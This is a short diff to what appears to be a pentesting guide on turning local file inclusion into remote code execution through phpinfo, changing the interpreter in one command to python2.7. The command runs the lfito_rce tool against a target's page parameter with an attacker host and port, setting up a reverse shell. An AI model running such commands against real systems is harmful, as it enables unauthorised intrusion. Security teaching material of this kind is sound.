@@ -19,7 +19,7 @@ We can use the [lfito\_rce](https://github.com/roughiz/lfito\_rce) to exploit it
 
 ```bash
 #There is no requirements.txt, the dependencies have to be installed manually
-python lfito_rce.py -l "http://$URL/?page=" --lhost=$attackerIP --lport=$attackerPORT -i "http://$URL/phpinfo.php"
+python2.7 lfito_rce.py -l "http://$URL/?page=" --lhost=$attackerIP --lport=$attackerPORT -i "http://$URL/phpinfo.php"
 ```
 
 ## Resources
